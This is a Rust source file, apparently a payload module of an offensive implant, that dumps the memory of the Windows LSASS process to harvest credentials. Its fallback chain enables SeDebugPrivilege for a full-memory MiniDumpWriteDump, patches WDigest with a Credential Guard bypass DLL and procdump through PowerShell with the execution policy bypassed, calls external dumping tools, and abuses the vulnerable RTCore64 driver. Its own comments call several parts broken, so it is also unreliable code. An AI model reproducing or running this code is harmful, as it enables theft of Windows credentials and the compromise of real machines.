/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// payload/lsass.rs — LSASS memory dump with fallback chain.
//
// Order: native MiniDumpWriteDump → WDigest+procdump → lsawhisper →
// dumpguard_bof → RTCore64 "PPL bypass" then MiniDump again.
//
// BROKEN:
//   - winapi dbghelp feature not in Cargo.toml → MiniDumpWriteDump may not compile.
//   - tools/ is empty; all external-tool steps skip.
//   - TOOLS_DIR is option_env! (compile-time), not runtime.
//   - PPL bypass calls run_byovd to *kill* lsass.exe, not dump it.
//   - MiniDumpWriteDump against PPL LSASS typically fails without a bypass.
//   - Even a successful dump is lost: Worker truncates /exfil ciphertext.

use log::{info, error};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::fs;

// ── Tool path helper ──────────────────────────────────────────────────────────

/// Path to tools/<name> if the file exists. TOOLS_DIR is compile-time.
fn tool_path(name: &str) -> Option<PathBuf> {
    let dir = option_env!("TOOLS_DIR").unwrap_or("tools");
    let p = PathBuf::from(dir).join(name);
    if p.exists() { Some(p) } else {
        log::warn!("Tool not found: {}", p.display());
        None
    }
}

// ── LSASS PID lookup ─────────────────────────────────────────────────────────

/// First process named lsass.exe, or 0 if none (should not happen on Windows).
fn find_lsass_pid() -> u32 {
    use sysinfo::System;
    let mut sys = System::new_all();
    sys.refresh_processes();
    for proc in sys.processes().values() {
        if proc.name().to_lowercase() == "lsass.exe" {
            return proc.pid().as_u32();
        }
    }
    0
}

// ── Fallback chain ────────────────────────────────────────────────────────────

/// Try dump methods in order; true if any wrote `output_path`.
pub fn dump_lsass(output_path: &str) -> bool {
    info!("LSASS dump fallback chain: {}", output_path);
    if dump_via_minidump_native(output_path)  { return true; }
    if dump_via_wdigest_patch(output_path)    { return true; }
    if dump_via_lsa_whisperer(output_path)    { return true; }
    if dump_via_dumpguard(output_path)        { return true; }
    if dump_via_ppl_bypass(output_path)       { return true; }
    error!("All LSASS dump methods failed.");
    false
}

/// MiniDumpWriteDump via Windows native API — no external tools.
/// Requires SeDebugPrivilege (usually held by SYSTEM/admin processes).
fn dump_via_minidump_native(output_path: &str) -> bool {
    use winapi::um::processthreadsapi::{OpenProcess, OpenProcessToken};
    use winapi::um::securitybaseapi::{AdjustTokenPrivileges, LookupPrivilegeValueW};
    use winapi::um::winnt::{HANDLE, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, SE_PRIVILEGE_ENABLED,
                             PROCESS_ALL_ACCESS, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, LUID};
    use winapi::um::dbghelp::MiniDumpWriteDump; // BROKEN: need winapi feature "dbghelp"
    use winapi::shared::minwindef::{DWORD, FALSE};
    use std::ptr;

    let pid = find_lsass_pid();
    if pid == 0 { return false; }

    unsafe {
        // Enable SeDebugPrivilege.
        let mut token: HANDLE = ptr::null_mut();
        let cur_proc = winapi::um::processthreadsapi::GetCurrentProcess();
        if OpenProcessToken(cur_proc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let mut luid = LUID { LowPart: 0, HighPart: 0 };
        let priv_name: Vec<u16> = "SeDebugPrivilege\0".encode_utf16().collect();
        LookupPrivilegeValueW(ptr::null(), priv_name.as_ptr(), &mut luid);
        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
        };
        AdjustTokenPrivileges(token, FALSE, &mut tp, 0, ptr::null_mut(), ptr::null_mut());
        winapi::um::handleapi::CloseHandle(token);

        // Open LSASS.
        let h_lsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if h_lsass.is_null() { return false; }

        // Open output file.
        let wide_path: Vec<u16> = output_path.encode_utf16().chain(Some(0)).collect();
        let h_file = winapi::um::fileapi::CreateFileW(
            wide_path.as_ptr(),
            winapi::um::winnt::GENERIC_WRITE,
            0, ptr::null_mut(),
            winapi::um::fileapi::CREATE_ALWAYS,
            winapi::um::winnt::FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        );
        if h_file == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            winapi::um::handleapi::CloseHandle(h_lsass);
            return false;
        }

        // MiniDumpWriteDump.
        let ok = MiniDumpWriteDump(h_lsass, pid, h_file, 0x00000002 /*MiniDumpWithFullMemory*/,
                                   ptr::null_mut(), ptr::null_mut(), ptr::null_mut());
        winapi::um::handleapi::CloseHandle(h_file);
        winapi::um::handleapi::CloseHandle(h_lsass);

        if ok != 0 {
            info!("Native MiniDumpWriteDump succeeded.");
            true
        } else {
            false
        }
    }
}

/// WDigest patch via NativeBypassCredGuard.dll + procdump.
/// Skips if either file is missing (they are, in this tree).
fn dump_via_wdigest_patch(output_path: &str) -> bool {
    let dll  = match tool_path("NativeBypassCredGuard.dll") { Some(p) => p, None => return false };
    let proc = match tool_path("procdump.exe")              { Some(p) => p, None => return false };
    let script = format!(
        r#"Add-Type -Path "{}"; [NativeBypassCredGuard.Program]::PatchWDigest(); & "{}" -accepteula -ma lsass.exe {}"#,
        dll.display(), proc.display(), output_path
    );
    Command::new("powershell")
        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &script])
        .output().map(|o| o.status.success()).unwrap_or(false)
}

fn dump_via_lsa_whisperer(output_path: &str) -> bool {
    let exe = match tool_path("lsawhisper.exe") { Some(p) => p, None => return false };
    Command::new("cmd")
        .args(&["/C", &format!("{} --dump > {}", exe.display(), output_path)])
        .output().map(|o| o.status.success()).unwrap_or(false)
}

fn dump_via_dumpguard(output_path: &str) -> bool {
    let exe = match tool_path("dumpguard_bof.exe") { Some(p) => p, None => return false };
    Command::new("cmd")
        .args(&["/C", &format!("{} > {}", exe.display(), output_path)])
        .output().map(|o| o.status.success()).unwrap_or(false)
}

/// BROKEN: uses BYOVD to terminate lsass (IOCTL kill), then MiniDump.
/// That is not a PPL bypass; if the IOCTL worked it would crash the host.
fn dump_via_ppl_bypass(output_path: &str) -> bool {
    let pid = find_lsass_pid();
    if pid == 0 { return false; }

    let config = crate::byovd::GenericDriver {
        name: "RTCore64", file: "RTCore64.sys",
        path: r"\\.\RTCore64".to_string(), ioctl: 0xAA013044,
    };
    if crate::byovd::run_byovd(&config, pid, "lsass.exe") {
        dump_via_minidump_native(output_path)
    } else {
        false
    }
}
